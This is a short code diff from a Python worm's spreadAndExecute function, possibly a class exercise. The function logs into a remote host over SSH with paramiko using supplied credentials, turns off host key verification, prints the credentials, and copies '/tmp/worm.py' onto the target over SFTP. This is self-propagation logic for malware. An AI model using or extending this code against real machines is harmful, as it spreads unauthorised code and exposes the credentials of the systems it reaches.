@@ -108,6 +108,10 @@ def spreadAndExecute(sshClient):
 
 	# kevin
 	ssh = paramiko.SSHClient()
+	print("SSH 1",sshClient[1] )
+	print("SSH 2",sshClient[2] )
+	print("SSH 3",sshClient[3] )
+	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
 	ssh.connect(sshClient[1], username=sshClient[2], password=sshClient[3])
 	sftpClient = ssh.open_sftp()
 	sftpClient.put("/tmp/worm.py", "/tmp/worm.py")
